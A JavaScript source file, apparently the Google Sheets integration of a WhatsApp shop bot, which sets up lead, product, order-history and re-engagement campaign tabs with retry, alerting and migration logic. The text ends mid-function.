const fs = require('fs');
const path = require('path');
const { google } = require('googleapis');
const config = require('../config');
const logger = require('../utils/logger');
const { runLimited } = require('../utils/concurrencyLimiter');
const { retryAsync, isTransientError } = require('../utils/retry');
const emailAlert = require('../utils/emailAlert');

// 2026-07-28 audit: appendLead runs 2-3 sequential Sheets API calls per
// customer message (read existing row state, update/append the row, write
// the conversation-history note) with no cap and no retry. Under the same
// message-burst incident that hit OpenAI/Gemini (see concurrencyLimiter.js),
// these calls failed repeatedly ("Failed to write row to Google Sheet") and
// were silently swallowed — real leads were lost, not just delayed. This
// wraps each Sheets call with a bounded retry on transient failures, and
// caps how many concurrent appendLead operations run at once.
function sheetsCall(fn) {
  return retryAsync(fn, { retries: 2, baseDelayMs: 500, isRetryable: isTransientError });
}

const LEADS_SHEET_NAME = 'Leads';
const PRODUCTS_SHEET_NAME = 'Products';
// Separate, append-only tab — never upserted-per-phone like Leads is. Leads
// holds one row per customer reflecting their CURRENT state (overwritten on
// every message), so it can't answer "what did this person buy over time" —
// this tab is one row per completed order specifically so that question has
// a real answer. Backs getCustomerHistory()/logOrderHistory() below, which
// power the "Customer Memory & Feedback Retargeting" feature in llmAgent.js.
const ORDER_HISTORY_SHEET_NAME = 'Order History';
const LOCAL_PRODUCTS_PATH = path.join(__dirname, '..', '..', 'products.json');

// Column layout, current as of 2026-07-16 (verified live after every
// structural change below — see HISTORY): A Date, B Customer Name, C
// Customer WhatsApp Number, D Alternative Phone (physically adjacent to the
// primary phone column, per explicit request), E Product Name, F Customer
// Need, G Delivery Address (physically directly before Order Status, per
// explicit request), H Order Status, I Notes, J Conversation History
// (bot-owned: indicator value + full history in the cell Note), K Follow-up
// Date (staff-owned manual column, round-tripped unchanged by appendLead).
//
// HISTORY: this tab has been physically restructured three times now — (1)
// the store owner deleted a "human interaction" column directly in the
// Sheet UI, shifting everything after it left by one; the code wasn't
// updated in step, which silently corrupted the Follow-up Date column for a
// window (see git history); (2) 2026-07-16, moved Alternative Phone next to
// the phone column and Delivery Address before Order Status via two
// explicit moveDimension calls; (3) same day, deleted Customer Message
// entirely (its content is still captured per-message in the Conversation
// History note via buildHistoryEntries — only the standalone column was
// redundant). (2) and (3) both happened live with the bot still running on
// stale code for a few minutes before this file caught up, which produced
// one garbled row (repaired manually afterward). If this tab's layout ever
// looks wrong again, verify the LIVE header row first — don't trust this
// comment or any code constant, and stop the beauty-hub-bot PM2 process
// before making further structural changes to the sheet, not after.
const LEADS_HEADERS = [
  'Date',
  'Customer Name',
  'Customer WhatsApp Number',
  'Alternative Phone',
  'Product Name',
  'Customer Need',
  'Delivery Address',
  'Order Status',
  'Notes',
  'Conversation History',
  'Follow-up Date',
  // 2026-08-03 P1 addition — appended at the end (not inserted next to
  // "Notes") deliberately: this tab still uses fixed-position row[N]
  // destructuring (see appendLead/getExistingRowState below), so inserting a
  // column in the middle would shift every column after it, exactly the
  // historical bug described in the HISTORY note above. Purely staff-owned
  // and round-tripped unchanged by appendLead, same as Follow-up Date — the
  // bot never writes to this column. Exists because the bot-owned "Notes"
  // column (I) gets overwritten by the bot's own next write for that
  // customer, so it can never hold a durable staff annotation.
  'Staff Notes',
];

// Order Status values the bot itself ever writes as a deliberate, specific
// event (order confirmed, cancelled, escalated, etc. — see agent.js/
// llmAgent.js). Deliberately NOT the same list as formatLeadsSheet.js's
// staff-facing dropdown (which also includes staff-only values like
// "Delivered"/"Out for Delivery" the bot never sets itself) — this set is
// just the ones resolveEarlyStageOrderStatus's generic recompute (below)
// needs to be careful not to regress.
const GENERIC_ORDER_STATUSES = new Set(['Pending', 'In Progress']);

// 2026-07-18: "Skin Type"/"Hair Type" merged into a single "Skin/Hair Type"
// column (see the one-time Sheet migration this shipped alongside) — only
// affects ensureHeaderRow's backfill-if-shorter behavior for a brand-new
// sheet; it does not rename an already-existing header row (see
// ensureHeaderRow below), so this has no effect on the already-migrated
// production/sandbox sheets.
const PRODUCTS_HEADERS = [
  'ID',
  'Name',
  'Category',
  'Price',
  'Description',
  'Benefits',
  'Skin/Hair Type',
  'In Stock',
];

const ORDER_HISTORY_HEADERS = ['Date', 'Customer Name', 'Phone', 'Product Name', 'Price', 'Order Status'];

// --- CRM/campaign tracker (2026-07-30) — separate, additive tabs for the
// re-engagement campaign built that day. Never replaces Leads/Order History
// (those stay the system of record for the live bot's normal flow); this is
// a filtered, campaign-specific view on top. See campaignWorker.js for the
// worker that reads/writes these.
const TARGETED_CLIENTS_SHEET_NAME = 'Targeted_Clients';
const OFFERS_CAMPAIGN_SHEET_NAME = 'Offers_Campaign';
const CONFIRMED_ORDERS_SHEET_NAME = 'Confirmed_Orders';

// Chat ID (column B) is the real send target — WhatsApp addressing needs the
// @lid/@c.us id, not the human-readable phone in column A, which can fail to
// resolve for privacy-mode contacts (see resolveRealPhone in whatsapp/client.js).
const TARGETED_CLIENTS_HEADERS = [
  'Phone Number',
  'Chat ID',
  'Customer Name',
  'Last Interested Category/Product',
  'Campaign Status', // ON_HOLD | PENDING | OFFER_SENT | REPLIED | ORDERED | DECLINED | NEEDS_HUMAN_REVIEW
  'Lead Source',
  'Recency Tier (Days)',
  'Campaign Touches',
  'Objection/Decline Reason',
  'Opt-Out',
  'Last Message Date',
  'Sent At',
  'Replied At',
  'Ordered At',
  // Which of Offers_Campaign's (up to 5) offer rows this contact actually
  // received — added 2026-08-02 when the campaign moved from one single
  // offer to a multi-offer table. Blank for rows created/sent before that.
  'Offer Sent',
  // --- 2026-08-03 P1 sheet-control additions ---
  // Per-contact kill switch for the bot's main reply flow (checked in
  // whatsapp/client.js, same priority tier as the human-handoff cooldown and
  // the global "وقف البوت" pause) — closes the gap the 2026-08-03 audit
  // flagged: the only prior way to silence the bot for one specific customer
  // was the global pause (every customer) or the automatic, non-owner-
  // triggerable human-handoff cooldown. Plain TRUE/FALSE text, same
  // convention as Opt-Out (not a Sheets checkbox — nothing else in this tab
  // uses one, and staff already know the TRUE/FALSE convention from Opt-Out).
  'Bot Paused (this contact)',
  // Ad-hoc "send the campaign's active offer to this row right now" trigger,
  // polled by campaignWorker.js alongside its normal 6-min tick — the only
  // prior way to message one arbitrary contact was a token-gated curl to
  // POST /admin/send-message. Reset to FALSE automatically after the send is
  // attempted (success or failure — see runSendNowCheck for why).
  'Send Now',
  // Hard blocklist, checked in whatsapp/client.js before ANY processing of an
  // inbound message from this chatId (before even auto-capture/logging) —
  // stronger than "Bot Paused" above, which still logs/captures the contact
  // normally and only silences the bot's own reply. Meant for spam/abusive
  // numbers the owner wants the bot to fully ignore, not customers being
  // handled manually for now.
  'Blocked',
];

const CONFIRMED_ORDERS_HEADERS = [
  'Date',
  'Customer Name',
  'Phone',
  'Address',
  'Products',
  'Total Price',
  'Invoice Link',
  'Print Invoice',
];

// A row-per-offer table (2026-08-02) — replaced the old single fixed-cell
// control panel (one CAMPAIGN_STATUS/OFFER_TEXT/TEST_TRIGGER for the whole
// tab) so the owner can run up to 5 independent campaigns at once instead of
// one at a time, without adding more sheet tabs. A row's own CAMPAIGN_STATUS
// must be PUSH (not PAUSE) AND a Targeted_Clients row's Campaign Status must
// be PENDING (not ON_HOLD) for that contact to actually get a message; both
// gates default closed. See ensureOffersCampaignSeeded() for the one-time
// migration that preserves whatever campaign was already live under the old
// layout as Offer 1, and getOffersCampaignRows()/campaignWorker.js for how
// this is read/written.
// Product ID (column G, 2026-08-02 audit fix) — grounds an offer's free-text
// OFFER_TEXT marketing copy in a real, priced catalog SKU. Without this, an
// offer describing a product by a marketing name that doesn't exactly match
// the catalog (e.g. "مبرد القدم الكهربائي" in copy vs. "مبرد قدم" in the
// catalog, found 2026-08-02 as the reason a customer's explicit "عايزة عرض
// مبرد القدم" went unrecognized) leaves the agent with no real product to
// ground a reply/price against when a customer references the offer — see
// campaignKnowledge.js (system-prompt grounding) and campaignWorker.js
// (injects the resolved product into the recipient's session so it's always
// a valid candidate on their next turn, same mechanism as
// session.recommendedProduct in llmAgent.js). Optional: an offer with no
// Product ID (or one that doesn't resolve) still sends fine — this is
// additive grounding, not a requirement to run a campaign.
const OFFERS_CAMPAIGN_HEADERS = ['Offer ID', 'Offer Name', 'OFFER_TEXT', 'CAMPAIGN_STATUS', 'TEST_TRIGGER', 'LAST_TEST_SENT_AT', 'Product ID'];
const OFFERS_CAMPAIGN_OFFER_COUNT = 5;
// Worker heartbeat — global, not per-offer, so it lives in a small side
// panel (column I) next to the table rather than as another table column.
const OFFERS_CAMPAIGN_HEARTBEAT_CELL = 'I2';

// Headroom below the header for banding/validation/borders to already cover
// future rows the worker or the owner adds later, without re-running this.
const DATA_TABLE_MAX_ROWS = 1000;

// Shared "styled data table" look for Targeted_Clients/Confirmed_Orders:
// frozen dark header row, light gridlines, alternating row banding (banding
// deliberately starts at row 2 — startRowIndex 1 — so it never fights with
// the header row's own explicit dark styling below it), and auto-fit
// columns. Column-specific formatting (dropdowns, currency, etc.) is added
// by each tab's own function on top of this.
function dataTableStyleRequests(sheetId, columnCount) {
  const fullRange = { sheetId, startRowIndex: 0, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: 0, endColumnIndex: columnCount };
  const headerRange = { sheetId, startRowIndex: 0, endRowIndex: 1, startColumnIndex: 0, endColumnIndex: columnCount };
  const dataRange = { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: 0, endColumnIndex: columnCount };
  const headerColor = { red: 0.16, green: 0.2, blue: 0.26 };

  return [
    { updateSheetProperties: { properties: { sheetId, gridProperties: { frozenRowCount: 1 } }, fields: 'gridProperties.frozenRowCount' } },
    {
      repeatCell: {
        range: headerRange,
        cell: {
          userEnteredFormat: {
            backgroundColor: headerColor,
            textFormat: { bold: true, foregroundColor: { red: 1, green: 1, blue: 1 }, fontSize: 10 },
            verticalAlignment: 'MIDDLE',
            horizontalAlignment: 'CENTER',
            wrapStrategy: 'WRAP',
          },
        },
        fields: 'userEnteredFormat(backgroundColor,textFormat,verticalAlignment,horizontalAlignment,wrapStrategy)',
      },
    },
    {
      updateBorders: {
        range: fullRange,
        top: { style: 'SOLID_MEDIUM', color: { red: 0.2, green: 0.2, blue: 0.2 } },
        bottom: { style: 'SOLID', color: { red: 0.7, green: 0.7, blue: 0.7 } },
        left: { style: 'SOLID_MEDIUM', color: { red: 0.2, green: 0.2, blue: 0.2 } },
        right: { style: 'SOLID_MEDIUM', color: { red: 0.2, green: 0.2, blue: 0.2 } },
        innerHorizontal: { style: 'SOLID', color: { red: 0.88, green: 0.88, blue: 0.88 } },
        innerVertical: { style: 'SOLID', color: { red: 0.88, green: 0.88, blue: 0.88 } },
      },
    },
    {
      addBanding: {
        bandedRange: {
          range: dataRange,
          rowProperties: {
            firstBandColor: { red: 1, green: 1, blue: 1 },
            secondBandColor: { red: 0.95, green: 0.96, blue: 0.98 },
          },
        },
      },
    },
    { autoResizeDimensions: { dimensions: { sheetId, dimension: 'COLUMNS', startIndex: 0, endIndex: columnCount } } },
  ];
}

const REQUEST_TIMEOUT_MS = 15 * 1000; // never let a stalled network call block the bot
// Idempotency window for logOrderHistory/appendConfirmedOrder (2026-08-02
// incident: a stale-session bug in llmAgent.js re-triggered the same
// confirmed order 3x within ~2 min — see that fix for the root cause). This
// is a last-line-of-defense check, not the primary fix: there's no real
// order/transaction ID anywhere in this system, so "same order" is
// approximated as (phone, product, price) seen again within this window —
// wide enough to catch a re-triggered turn, narrow enough to never silently
// swallow a genuine second purchase of the same product later the same day.
const ORDER_DEDUP_WINDOW_MS = 10 * 60 * 1000;
const STARTUP_TIMEOUT_MS = 20 * 1000;
const RETRY_INTERVAL_MS = 2 * 60 * 1000; // retry a failed/timed-out setup automatically
const STALE_THRESHOLD_MS = 30 * 60 * 1000; // warn if nothing succeeded in this long
const STALENESS_CHECK_INTERVAL_MS = 5 * 60 * 1000;

let sheetsClient = null;
let enabled = false;
let retryTimer = null;
let lastSuccessAt = null;
let staleWarningLogged = false;
// Numeric sheetId of the Leads tab (distinct from its name) — required by
// batchUpdate's updateCells requests (used to set cell Notes below), which
// address cells via GridRange{sheetId, rowIndex, columnIndex} rather than the
// "SheetName!A1" strings the values.* endpoints take. Resolved once in
// ensureSheetsStructure() at startup.
let leadsSheetId = null;
// phone -> 1-based row number in the Leads sheet. Built once at startup by
// reading the existing sheet, then kept in sync as rows are written, so
// appendLead can upsert (one row per phone) instead of always inserting.
let phoneRowCache = new Map();
// phone -> array of { date (ISO string), timestamp (ms), productName, price },
// most-recent-first. Built once at startup from the Order History tab, then
// kept in sync in-memory as new orders are logged — a per-message lookup
// (getCustomerHistory) is a Map read, never a Sheets API call.
let customerHistoryCache = new Map();

// Called after any successful Sheets operation (setup, lead append, product
// fetch) so /health and the staleness monitor reflect real connectivity, not
// just whether Sheets was configured.
function recordSuccess() {
  lastSuccessAt = Date.now();
  staleWarningLogged = false;
}

function getLastSuccessAt() {
  return lastSuccessAt;
}

function isStale(thresholdMs = STALE_THRESHOLD_MS) {
  if (!enabled) return false; // intentionally disabled isn't "stale"
  if (!lastSuccessAt) return true;
  return Date.now() - lastSuccessAt > thresholdMs;
}

function checkStaleness() {
  if (!enabled || staleWarningLogged) return;
  if (isStale()) {
    staleWarningLogged = true;
    const minutesSince = lastSuccessAt ? Math.round((Date.now() - lastSuccessAt) / 60000) : null;
    const minutesLabel = minutesSince !== null ? `${minutesSince} minutes` : 'a while';
    logger.warn(
      `Google Sheets has not synced successfully in ${minutesLabel} — check network/credentials. The bot continues running normally with the last known data.`
    );
    // staleWarningLogged (reset in recordSuccess) already dedups this to one
    // alert per outage episode, on top of emailAlert's own per-type cooldown.
    emailAlert.sendAlert('google_sheets_stale', {
      subject: '⚠️ Beauty Hub Bot — Google Sheets sync failing consistently',
      text: `Google Sheets has not synced successfully in ${minutesLabel} (threshold: ${STALE_THRESHOLD_MS / 60000} min). Leads/orders/product-catalog data may be stale or not being logged. The WhatsApp bot itself continues running normally — this only affects the Sheets integration.`,
    });
  }
}

function startStalenessMonitor(intervalMs = STALENESS_CHECK_INTERVAL_MS) {
  const timer = setInterval(checkStaleness, intervalMs);
  if (timer.unref) timer.unref();
}

function columnLetter(count) {
  return String.fromCharCode(64 + count); // 9 -> 'I'
}

function withTimeout(promise, ms, label) {
  let timer;
  const timeout = new Promise((_, reject) => {
    timer = setTimeout(() => reject(new Error(`Timed out after ${ms}ms: ${label}`)), ms);
  });
  return Promise.race([promise, timeout]).finally(() => clearTimeout(timer));
}

async function init() {
  if (!config.googleSheetId) {
    logger.warn('GOOGLE_SHEET_ID is not set. Google Sheets logging is disabled. The WhatsApp bot will continue running without it.');
    enabled = false;
    return;
  }

  if (!fs.existsSync(config.credentialsAbsolutePath)) {
    logger.warn(
      `Google credentials file not found at "${config.credentialsAbsolutePath}". Google Sheets logging is disabled. The WhatsApp bot will continue running without it.`
    );
    enabled = false;
    return;
  }

  try {
    const auth = new google.auth.GoogleAuth({
      keyFile: config.credentialsAbsolutePath,
      scopes: ['https://www.googleapis.com/auth/spreadsheets'],
    });
    sheetsClient = google.sheets({ version: 'v4', auth });
    // Set before ensureSheetsStructure() runs (its sub-steps gate on this
    // flag), but success is NOT logged/recorded until that call actually
    // completes without throwing — see the 2026-07-28 audit note on
    // ensureSheetsStructure() for why: this used to fire unconditionally
    // right here, which logged "initialized" even when structure
    // verification failed immediately afterward (confirmed live 2026-07-27:
    // an OK "initialized" log was followed by hours of "Leads sheetId not
    // resolved" warnings with no retry ever scheduled).
    enabled = true;
    await withTimeout(ensureSheetsStructure(), STARTUP_TIMEOUT_MS, 'Google Sheet tab setup');
    recordSuccess();
    stopRetryTimer();
    logger.success('Google Sheets service initialized and verified.');

    // Deliberately separate from ensureSheetsStructure()'s try/catch above,
    // and non-fatal: the CRM/campaign tabs are additive and optional, unlike
    // Leads/Products/Order History which the core bot depends on. A problem
    // here must never take down normal Sheets logging.
    try {
      await withTimeout(ensureCrmTabs(), STARTUP_TIMEOUT_MS, 'CRM tab setup');
    } catch (err) {
      logger.error(
        'Could not verify/create CRM campaign tabs (Targeted_Clients/Offers_Campaign/Confirmed_Orders). Core Sheets logging is unaffected.',
        err
      );
    }
  } catch (err) {
    logger.error(
      `Google Sheets setup did not complete (network issue or slow response). The WhatsApp bot will continue running; Sheets logging is disabled until connectivity recovers — retrying automatically every ${RETRY_INTERVAL_MS / 1000}s.`,
      err
    );
    enabled = false;
    scheduleRetry();
  }
}

function scheduleRetry() {
  if (retryTimer) return;
  retryTimer = setInterval(() => {
    logger.info('Retrying Google Sheets connection...');
    init();
  }, RETRY_INTERVAL_MS);
  if (retryTimer.unref) retryTimer.unref();
}

function stopRetryTimer() {
  if (retryTimer) {
    clearInterval(retryTimer);
    retryTimer = null;
  }
}

async function ensureSheetsStructure() {
  if (!enabled) return;
  try {
    const meta = await sheetsClient.spreadsheets.get(
      { spreadsheetId: config.googleSheetId },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    const existingTitles = (meta.data.sheets || []).map((s) => s.properties.title);

    const requests = [];
    if (!existingTitles.includes(LEADS_SHEET_NAME)) {
      requests.push({ addSheet: { properties: { title: LEADS_SHEET_NAME } } });
    }
    if (!existingTitles.includes(PRODUCTS_SHEET_NAME)) {
      requests.push({ addSheet: { properties: { title: PRODUCTS_SHEET_NAME } } });
    }
    if (!existingTitles.includes(ORDER_HISTORY_SHEET_NAME)) {
      requests.push({ addSheet: { properties: { title: ORDER_HISTORY_SHEET_NAME } } });
    }

    if (requests.length > 0) {
      await sheetsClient.spreadsheets.batchUpdate(
        { spreadsheetId: config.googleSheetId, requestBody: { requests } },
        { timeout: REQUEST_TIMEOUT_MS }
      );
      logger.info(`Created Google Sheet tab(s): ${requests.map((r) => r.addSheet.properties.title).join(', ')}`);
    }

    // Re-fetch only if a tab was just created (the Leads tab's sheetId
    // wouldn't be in the `meta` snapshot taken before that batchUpdate ran) —
    // otherwise reuse `meta` rather than spending an extra API call on every
    // startup.
    const leadsMetaSource = requests.length > 0
      ? (await sheetsClient.spreadsheets.get({ spreadsheetId: config.googleSheetId }, { timeout: REQUEST_TIMEOUT_MS })).data
      : meta.data;
    const leadsSheetMeta = (leadsMetaSource.sheets || []).find((s) => s.properties.title === LEADS_SHEET_NAME);
    if (leadsSheetMeta) leadsSheetId = leadsSheetMeta.properties.sheetId;

    await ensureHeaderRow(LEADS_SHEET_NAME, LEADS_HEADERS);
    await ensureProductsTabSeeded();
    await ensureHeaderRow(ORDER_HISTORY_SHEET_NAME, ORDER_HISTORY_HEADERS);
    await loadPhoneRowCache();
    await loadCustomerHistoryCache();
  } catch (err) {
    // Rethrow (2026-07-28 fix) instead of swallowing: this catch only ever
    // fires for the critical path above (spreadsheets.get/batchUpdate/leadsSheetId
    // resolution) — ensureHeaderRow/loadPhoneRowCache/loadCustomerHistoryCache
    // each already catch their own errors and degrade gracefully without
    // throwing, so they never reach here. Letting this propagate to init()'s
    // catch is what makes recordSuccess()/stopRetryTimer() only fire on real
    // success, and what makes scheduleRetry() actually run instead of never
    // firing. Previously this was swallowed here, which left the bot
    // reporting itself healthy for hours while leadsSheetId stayed
    // unresolved and nothing ever retried.
    logger.error('Could not verify/create Google Sheet tabs.', err);
    throw err;
  }
}

async function ensureHeaderRow(sheetName, headers) {
  if (!enabled) return;
  try {
    const range = `${sheetName}!A1:${columnLetter(headers.length)}1`;
    const result = await sheetsClient.spreadsheets.values.get(
      { spreadsheetId: config.googleSheetId, range },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    // Re-write (not just create) the header whenever it's shorter than the
    // current headers list, so adding a trailing column (e.g. Conversation
    // History) to an already-initialized sheet gets backfilled automatically
    // on the next restart instead of silently missing its header forever.
    const values = (result.data.values && result.data.values[0]) || [];
    if (values.length < headers.length) {
      await sheetsClient.spreadsheets.values.update(
        {
          spreadsheetId: config.googleSheetId,
          range,
          valueInputOption: 'RAW',
          requestBody: { values: [headers] },
        },
        { timeout: REQUEST_TIMEOUT_MS }
      );
      logger.info(`Header row created/updated for "${sheetName}" tab.`);
    }
  } catch (err) {
    logger.error(`Could not verify/create header row for "${sheetName}" tab.`, err);
  }
}

// --- CRM/campaign tracker (2026-07-30) ---

async function ensureCrmTabs() {
  if (!enabled) return;
  const meta = await sheetsClient.spreadsheets.get({ spreadsheetId: config.googleSheetId }, { timeout: REQUEST_TIMEOUT_MS });
  const existingTitles = (meta.data.sheets || []).map((s) => s.properties.title);

  const requests = [];
  if (!existingTitles.includes(TARGETED_CLIENTS_SHEET_NAME)) {
    requests.push({ addSheet: { properties: { title: TARGETED_CLIENTS_SHEET_NAME } } });
  }
  if (!existingTitles.includes(OFFERS_CAMPAIGN_SHEET_NAME)) {
    requests.push({ addSheet: { properties: { title: OFFERS_CAMPAIGN_SHEET_NAME } } });
  }
  if (!existingTitles.includes(CONFIRMED_ORDERS_SHEET_NAME)) {
    requests.push({ addSheet: { properties: { title: CONFIRMED_ORDERS_SHEET_NAME } } });
  }
  if (requests.length > 0) {
    await sheetsClient.spreadsheets.batchUpdate(
      { spreadsheetId: config.googleSheetId, requestBody: { requests } },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    logger.info(`Created Google Sheet tab(s): ${requests.map((r) => r.addSheet.properties.title).join(', ')}`);
  }

  await ensureHeaderRow(TARGETED_CLIENTS_SHEET_NAME, TARGETED_CLIENTS_HEADERS);
  await ensureHeaderRow(CONFIRMED_ORDERS_SHEET_NAME, CONFIRMED_ORDERS_HEADERS);
  await ensureOffersCampaignSeeded();
}

// Writes the 5-offer table the FIRST time (when A1 is empty), and migrates
// it in place the first startup after this table format was introduced
// (when A1 still holds the OLD layout's 'CAMPAIGN_STATUS' label) — never
// touches it again once the new headers are in place, so the owner's live
// edits are never clobbered by a redeploy. The old layout held exactly one
// live campaign in fixed cells (A1/B1 = CAMPAIGN_STATUS, A2/B2 = OFFER_TEXT,
// etc.) — migrating must not silently drop whatever was running, so that
// campaign is carried over verbatim into Offer 1 rather than reset to blank/
// PAUSE like the other 4 new slots.
async function ensureOffersCampaignSeeded() {
  if (!enabled) return;
  const result = await sheetsClient.spreadsheets.values.get(
    { spreadsheetId: config.googleSheetId, range: `${OFFERS_CAMPAIGN_SHEET_NAME}!A1:G5` },
    { timeout: REQUEST_TIMEOUT_MS }
  );
  const rows = result.data.values || [];
  const cell = (r, c) => (rows[r] && rows[r][c]) || '';
  const a1 = cell(0, 0);

  if (a1 === OFFERS_CAMPAIGN_HEADERS[0]) {
    // Already on the new table layout — never touch the data rows again so
    // the owner's live edits survive a redeploy. Still backfill a trailing
    // header cell if OFFERS_CAMPAIGN_HEADERS has grown since this sheet was
    // migrated (2026-08-02: added 'Product ID' as a 7th column) — same
    // "grow, never shrink or reorder" pattern as ensureHeaderRow(), just
    // applied to this table's own bespoke header row since its migration
    // logic doesn't go through that shared helper.
    const headerRow = rows[0] || [];
    if (headerRow.length < OFFERS_CAMPAIGN_HEADERS.length) {
      await sheetsClient.spreadsheets.values.update(
        {
          spreadsheetId: config.googleSheetId,
          range: `${OFFERS_CAMPAIGN_SHEET_NAME}!A1:${columnLetter(OFFERS_CAMPAIGN_HEADERS.length)}1`,
          valueInputOption: 'RAW',
          requestBody: { values: [OFFERS_CAMPAIGN_HEADERS] },
        },
        { timeout: REQUEST_TIMEOUT_MS }
      );
      logger.info(`Backfilled new header column(s) for "${OFFERS_CAMPAIGN_SHEET_NAME}" (now: ${OFFERS_CAMPAIGN_HEADERS.join(', ')}).`);
    }
    return;
  }

  const isOldPanel = a1 === 'CAMPAIGN_STATUS';
  const migratedStatus = isOldPanel && cell(0, 1).trim().toUpperCase() === 'PUSH' ? 'PUSH' : 'PAUSE';
  const migratedOfferText = isOldPanel ? cell(1, 1) : '';
  const migratedLastTestSentAt = isOldPanel ? cell(3, 1) : '';
  const migratedLastTickAt = isOldPanel ? cell(4, 1) : '';

  // The old panel layout only ever needed A1:C5, and this tab's grid was at
  // some point manually trimmed down to match (confirmed 2026-08-02: every
  // other CRM tab has hundreds of rows / 24+ columns, this one had exactly
  // 6x6) — too narrow for the new table's heartbeat cell in column H.
  // Widening a grid is always safe (never drops existing cell data), so this
  // just guarantees enough room before writing to it below.
  const meta = await sheetsClient.spreadsheets.get({ spreadsheetId: config.googleSheetId }, { timeout: REQUEST_TIMEOUT_MS });
  const sheetMeta = (meta.data.sheets || []).find((s) => s.properties.title === OFFERS_CAMPAIGN_SHEET_NAME);
  const gridProps = (sheetMeta && sheetMeta.properties.gridProperties) || {};
  if (sheetMeta && ((gridProps.columnCount || 0) < 8 || (gridProps.rowCount || 0) < OFFERS_CAMPAIGN_OFFER_COUNT + 1)) {
    await sheetsClient.spreadsheets.batchUpdate(
      {
        spreadsheetId: config.googleSheetId,
        requestBody: {
          requests: [
            {
              updateSheetProperties: {
                properties: {
                  sheetId: sheetMeta.properties.sheetId,
                  gridProperties: {
                    columnCount: Math.max(gridProps.columnCount || 0, 8),
                    rowCount: Math.max(gridProps.rowCount || 0, OFFERS_CAMPAIGN_OFFER_COUNT + 1),
                  },
                },
                fields: 'gridProperties.columnCount,gridProperties.rowCount',
              },
            },
          ],
        },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    );
  }

  const tableRows = [OFFERS_CAMPAIGN_HEADERS];
  for (let i = 1; i <= OFFERS_CAMPAIGN_OFFER_COUNT; i += 1) {
    if (i === 1) {
      tableRows.push([
        'OFFER_1',
        isOldPanel ? 'العرض الحالي (تم ترحيله تلقائياً)' : 'Offer 1',
        migratedOfferText,
        migratedStatus,
        '',
        migratedLastTestSentAt,
        '', // Product ID — left blank on migration; the owner links a real catalog SKU per offer as needed
      ]);
    } else {
      tableRows.push([`OFFER_${i}`, `Offer ${i}`, '', 'PAUSE', '', '', '']);
    }
  }

  await sheetsClient.spreadsheets.values.update(
    {
      spreadsheetId: config.googleSheetId,
      range: `${OFFERS_CAMPAIGN_SHEET_NAME}!A1:G${OFFERS_CAMPAIGN_OFFER_COUNT + 1}`,
      valueInputOption: 'RAW',
      requestBody: { values: tableRows },
    },
    { timeout: REQUEST_TIMEOUT_MS }
  );
  await sheetsClient.spreadsheets.values.update(
    {
      spreadsheetId: config.googleSheetId,
      range: `${OFFERS_CAMPAIGN_SHEET_NAME}!I1:I2`,
      valueInputOption: 'RAW',
      requestBody: { values: [['LAST_CAMPAIGN_TICK_AT'], [migratedLastTickAt]] },
    },
    { timeout: REQUEST_TIMEOUT_MS }
  );

  logger.success(
    isOldPanel
      ? `Migrated "${OFFERS_CAMPAIGN_SHEET_NAME}" from the single control panel to the 5-offer table — the previously live campaign (status ${migratedStatus}) was preserved as Offer 1.`
      : `Seeded "${OFFERS_CAMPAIGN_SHEET_NAME}" with ${OFFERS_CAMPAIGN_OFFER_COUNT} blank offer rows (all PAUSE).`
  );
}

// Array of { rowNumber, offerId, offerName, offerText, campaignStatus,
// testTrigger, lastTestSentAt, productId } — one per offer row. Read fresh
// every call, deliberately not cached, since the whole point is the owner
// can change these live in the sheet and have the worker notice within one
// cycle.
async function getOffersCampaignRows() {
  if (!enabled) return [];
  const result = await sheetsCall(() =>
    sheetsClient.spreadsheets.values.get(
      { spreadsheetId: config.googleSheetId, range: `${OFFERS_CAMPAIGN_SHEET_NAME}!A2:G${OFFERS_CAMPAIGN_OFFER_COUNT + 1}` },
      { timeout: REQUEST_TIMEOUT_MS }
    )
  );
  const values = result.data.values || [];
  return values.map((row, i) => ({
    rowNumber: i + 2,
    offerId: row[0] || '',
    offerName: row[1] || '',
    offerText: row[2] || '',
    campaignStatus: (row[3] || 'PAUSE').trim().toUpperCase(),
    testTrigger: (row[4] || '').trim().toUpperCase(),
    lastTestSentAt: row[5] || '',
    productId: (row[6] || '').trim(),
  }));
}

// Resets to 'IDLE', not blank — matches the TEST_TRIGGER dropdown's two
// valid values (SEND/IDLE) added by formatOffersCampaignTable() below, so
// the cell always shows a clean dropdown state after a test fires.
async function clearOfferTestTrigger(rowNumber) {
  if (!enabled) return;
  await sheetsCall(() =>
    sheetsClient.spreadsheets.values.update(
      {
        spreadsheetId: config.googleSheetId,
        range: `${OFFERS_CAMPAIGN_SHEET_NAME}!E${rowNumber}`,
        valueInputOption: 'RAW',
        requestBody: { values: [['IDLE']] },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    )
  );
}

async function setOfferLastTestSentAt(rowNumber, iso) {
  if (!enabled) return;
  try {
    await sheetsCall(() =>
      sheetsClient.spreadsheets.values.update(
        {
          spreadsheetId: config.googleSheetId,
          range: `${OFFERS_CAMPAIGN_SHEET_NAME}!F${rowNumber}`,
          valueInputOption: 'RAW',
          requestBody: { values: [[iso]] },
        },
        { timeout: REQUEST_TIMEOUT_MS }
      )
    );
  } catch (err) {
    logger.error(`Could not write LAST_TEST_SENT_AT for Offers_Campaign row ${rowNumber}.`, err);
  }
}

async function setLastCampaignTickAt(iso) {
  if (!enabled) return;
  try {
    await sheetsCall(() =>
      sheetsClient.spreadsheets.values.update(
        {
          spreadsheetId: config.googleSheetId,
          range: `${OFFERS_CAMPAIGN_SHEET_NAME}!${OFFERS_CAMPAIGN_HEARTBEAT_CELL}`,
          valueInputOption: 'RAW',
          requestBody: { values: [[iso]] },
        },
        { timeout: REQUEST_TIMEOUT_MS }
      )
    );
  } catch (err) {
    logger.error('Could not write LAST_CAMPAIGN_TICK_AT to Offers_Campaign.', err);
  }
}

// One row per targeted lead; small scale (dozens, not thousands) so this
// reads the whole tab fresh each call rather than maintaining a persistent
// row-number cache the way the much higher-volume Leads sheet does.
async function getTargetedClientsRows() {
  if (!enabled) return [];
  const range = `${TARGETED_CLIENTS_SHEET_NAME}!A2:${columnLetter(TARGETED_CLIENTS_HEADERS.length)}`;
  const result = await sheetsCall(() =>
